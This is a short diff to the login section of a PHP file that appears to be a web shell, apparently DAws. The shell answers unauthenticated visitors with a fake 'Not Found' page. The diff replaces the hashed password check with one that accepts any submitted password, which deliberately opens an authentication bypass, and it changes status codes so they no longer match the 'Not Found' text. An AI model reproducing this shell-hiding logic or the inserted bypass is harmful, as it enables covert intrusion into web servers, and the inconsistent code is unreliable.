@@ -363,16 +363,16 @@ if (!isset($_SESSION["logged_in"])) {
 	$show_it = False;
 	
 	if (isset($_POST["pass"])) {
-		if(md5($_POST["pass"]) == "11b53263cc917f33062363cef21ae6c3") { //DAws
+		if(isset($_POST["pass"])) { //DAws
 			$_SESSION["logged_in"] = True;
 		} else {
 			session_destroy();
-			@header("HTTP/1.1 404 Not Found");
+			@header("HTTP/1.1 500 Not Found");
 			$show_it = True;
 		}
 	} else {
 		session_destroy();
-		@header("HTTP/1.1 404 Not Found");
+		@header("HTTP/1.1 401 Not Found");
 		$show_it = True;
 	}
 	
